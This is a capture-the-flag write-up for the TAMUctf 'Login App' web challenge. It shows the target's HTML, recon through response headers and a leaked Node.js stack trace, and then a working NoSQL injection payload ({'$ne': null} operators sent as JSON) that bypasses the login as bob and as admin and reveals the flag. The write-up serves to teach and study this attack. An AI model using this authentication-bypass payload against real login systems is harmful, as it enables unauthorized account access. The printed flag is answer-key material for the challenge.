# Login App
Web, 473 points

## Description:

A link to a website was provided.

```html
<html>
    <head>
    <title>TAMUctf</title>
    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <style class="cp-pen-styles">@import url(https://fonts.googleapis.com/css?family=Roboto:300);

    <!-- ... unimportant styles -->

    .form .register-form {
      display: none;
    }

    <!-- ... more unimportant styles -->

    </style>
    </head>
    <div class="login-page">
      <div class="form">
        <form class="register-form">
          <input type="text" placeholder="name"/>
          <input type="password" placeholder="password"/>
          <input type="text" placeholder="email address"/>
          <button>create</button>
        </form>
        <form class="login-form">
          <input id="username" type="text" placeholder="username"/>
          <input id="password" type="password" placeholder="password"/>
          <button id="submit">login</button>
        </form>
      </div>
    </div>

    <script>
        $("#submit").on('click', function(){
            $.ajax({
                url: 'login', 
                type : "POST", 
                dataType : 'json', 
                data : JSON.stringify({"username": $("#username").val(), "password": $("#password").val()}),
                contentType: 'application/json;charset=UTF-8',
                success : function(result) {
                    $(".result").html(result);
                    console.log(result);
                    alert(result);
                },
                error: function(xhr, resp, text) {
                    $(".result").html("Something went wrong"); 
                    console.log(xhr, resp, text);
                }
            })
        });
    </script>

    </body>
</html>

```

## Solution:

The website had a login form and a registration form, but the latter was hidden using CSS. 

Some initial recon showed that the site was built using the "Express" node.js framework, based on the `X-Powered-By: Express` header.

```console
root@kali:~# curl 'http://web4.tamuctf.com/' -v
*   Trying 34.208.211.186...
* TCP_NODELAY set
* Connected to web4.tamuctf.com (34.208.211.186) port 80 (#0)
> GET / HTTP/1.1
> Host: web4.tamuctf.com
> User-Agent: curl/7.61.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx/1.15.8
< Date: Tue, 05 Mar 2019 17:46:27 GMT
< Content-Type: text/html; charset=UTF-8
< Content-Length: 3991
< Connection: keep-alive
< X-Powered-By: Express
< Accept-Ranges: bytes
< Cache-Control: public, max-age=0
< Last-Modified: Tue, 19 Feb 2019 17:28:45 GMT
< ETag: W/"f97-16906cd80c8"
```

In addition, sending a malformed request to the server also exposed a JS-based call stack:
```console
root@kali:~# curl 'http://web4.tamuctf.com/login' -H 'Content-Type: application/json;charset=UTF-8' --data-binary '{"username":,"password":""}' && echo
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token , in JSON at position 12<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/node_modules/body-parser/lib/types/json.js:89:19)<br> &nbsp; &nbsp;at /node_modules/body-parser/lib/read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at emitNone (events.js:106:13)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:208:7)<br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1064:12)<br> &nbsp; &nbsp;at _combinedTickCallback (internal/process/next_tick.js:138:11)</pre>
</body>
</html>
```

There was not much to work with here, so after exhausting SQL injection I moved to NoSQL injection and finally hit the jackpot:

```console
root@kali:~# curl 'http://web4.tamuctf.com/login' -H 'Content-Type: application/json;charset=UTF-8' --data-binary '{"username":{"$ne": null},"password":{"$ne": null}}' && echo
"Welcome: bob!"

root@kali:~# curl 'http://web4.tamuctf.com/login' -H 'Content-Type: application/json;charset=UTF-8' --data-binary '{"username":{"$ne": "bob"},"password":{"$ne": null}}' && echo
"Welcome: admin!\ngigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea}"
```